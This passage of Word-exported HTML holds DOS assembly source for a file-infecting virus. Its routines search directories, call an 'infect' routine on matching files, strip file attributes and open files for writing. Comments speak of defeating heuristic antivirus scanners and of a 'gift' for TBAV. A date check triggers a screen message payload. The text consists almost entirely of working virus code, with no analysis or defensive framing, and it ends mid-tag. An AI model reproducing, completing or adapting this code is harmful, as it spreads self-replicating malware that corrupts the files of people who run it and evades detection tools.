mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>findfirst<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>find_root:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jc<span
style='mso-tab-count:1'>    </span>try_win<span style='mso-tab-count:3'>                 </span>;if
none, exit<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>infect<span style='mso-tab-count:3'>                  </span>;else
infect<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,4fh<span style='mso-tab-count:3'>                  </span>;find
next<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jmp<span
style='mso-tab-count:1'>   </span>short find_root<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>try_win:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,3bh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+win_command]<span style='mso-tab-count:
1'>     </span>;change dir to command<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jc<span
style='mso-tab-count:1'>    </span>done_files<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>killer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>findfirst<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>find_win:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jc<span
style='mso-tab-count:1'>    </span>done_files<span style='mso-tab-count:2'>        </span>;if
none, exit<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>call<span
style='mso-tab-count:1'>  </span>infect<span style='mso-tab-count:3'>                  </span>;else
infect<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:1'>      </span><span
style='mso-tab-count:1'>      </span>mov<span style='mso-tab-count:1'>   </span>ah,4fh<span
style='mso-tab-count:3'>                  </span>;find next<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jmp<span
style='mso-tab-count:1'>   </span>short find_win<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>done_files:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,3bh<span style='mso-tab-count:3'>                  </span>;change
back to old_dir<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+old_dir]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,2ch<span style='mso-tab-count:3'>                  </span>;get
time<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>dx,5<span style='mso-tab-count:3'>              </span>;is
it time to activate?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>ja<span
style='mso-tab-count:1'>    </span>fix_dta<span style='mso-tab-count:3'>                 </span>;no?
return to host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>begin:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,13<span style='mso-tab-count:3'>             </span>;put
video in mode 13<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>int<span style='mso-tab-count:1'>   </span>10h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span>lea<span style='mso-tab-count:1'>   </span>si,[bp+msg]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>print_lp:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cld<span
style='mso-tab-count:4'>                     </span>;clear direction flag (left<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lodsb<span
style='mso-tab-count:4'>                   </span>;to right)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>or<span
style='mso-tab-count:1'>    </span>al,al<span style='mso-tab-count:3'>             </span>;check
for text end<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jz<span
style='mso-tab-count:1'>    </span>fix_1<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,0eh<span style='mso-tab-count:3'>                  </span>;write
char<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xor<span
style='mso-tab-count:1'>   </span>bh,bh<span style='mso-tab-count:3'>             </span>;page
0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>bl,5<span style='mso-tab-count:3'>              </span>;color
5 -&gt; magenta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>10h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jmp<span
style='mso-tab-count:1'>   </span>short print_lp<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>fix_1:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xor<span
style='mso-tab-count:1'>   </span>ax,ax<span style='mso-tab-count:3'>             </span>;wait
for key<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>16h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,03h<span style='mso-tab-count:3'>                  </span>;restore
to textmode<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>10h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- reset DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>fix_dta:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>1a00h<span style='mso-tab-count:3'>             </span>;fix
dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>dx,80h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>pop<span
style='mso-tab-count:1'>   </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- clean up<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xor<span
style='mso-tab-count:1'>   </span>ax,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>bx,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>dx,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>mov<span style='mso-tab-count:1'>   </span>di,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>mov<span
style='mso-tab-count:1'>   </span>bp,ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>si,0101h<span style='mso-tab-count:2'>          </span>;special
gift for TBAV<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- restore control to cs:0100h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>dec<span
style='mso-tab-count:1'>   </span>si<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>si<span style='mso-tab-count:3'>                </span>;put
100h on stack so virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>ret<span
style='mso-tab-count:4'>                     </span>;jumps to host<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- check name<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>infect:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>word ptr [bp+dta+1eh+5], &quot;DN&quot;<span
style='mso-tab-count:1'> </span>;commaND<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>je<span
style='mso-tab-count:1'>    </span>return<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>word ptr [bp+dta+1eh], &quot;BT&quot;<span
style='mso-tab-count:1'>  </span>;TBdel<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>je<span
style='mso-tab-count:1'>    </span>return<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,13d<span style='mso-tab-count:3'>                  </span>;max
file length<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>lea<span style='mso-tab-count:1'>   </span>si,[bp+dta+1eh]<span
style='mso-tab-count:2'>         </span>;filename in dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>compare:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lodsb<span
style='mso-tab-count:4'>                   </span>;get byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>al,&quot;.&quot;<span style='mso-tab-count:
3'>                  </span>;is it &quot;.&quot;?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>jne<span style='mso-tab-count:1'>   </span>compare<span
style='mso-tab-count:3'>                 </span>;no, compare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>cmp<span
style='mso-tab-count:1'>   </span>byte ptr [si],&quot;C&quot;<span
style='mso-tab-count:1'> </span>;is is *.C?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>jne<span
style='mso-tab-count:1'>   </span>return<span style='mso-tab-count:3'>                  </span>;no,
return<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- save attributes,time,date,size<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,5<span style='mso-tab-count:3'>              </span>;5
bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>si,[bp+dta+15h]<span style='mso-tab-count:
2'>         </span>;point to the dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>di,[bp+f_attr]<span style='mso-tab-count:
2'>          </span>;move to f_attr<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>rep<span
style='mso-tab-count:1'>   </span>movsb<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- remove attributes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,4301h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xor<span
style='mso-tab-count:1'>   </span>cx,cx<span style='mso-tab-count:3'>             </span>;no
attribute<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+dta+1eh]<span style='mso-tab-count:
2'>         </span>;point to name in dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- open file for read/write<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>3d04h<span style='mso-tab-count:3'>             </span>;!heuristic
killer!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho"'>lea<span style='mso-tab-count:1'>   </span>dx,[bp+dta+1eh]<span
style='mso-tab-count:2'>         </span>;filename in dta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span>pop<span style='mso-tab-count:1'>   </span>cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho"'><span
style='mso-tab-count:2'>            </span></span></b><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>sub<span
style='mso-tab-count:1'>   </span>cx,2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xchg<span
style='mso-tab-count:1'>  </span>ax,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
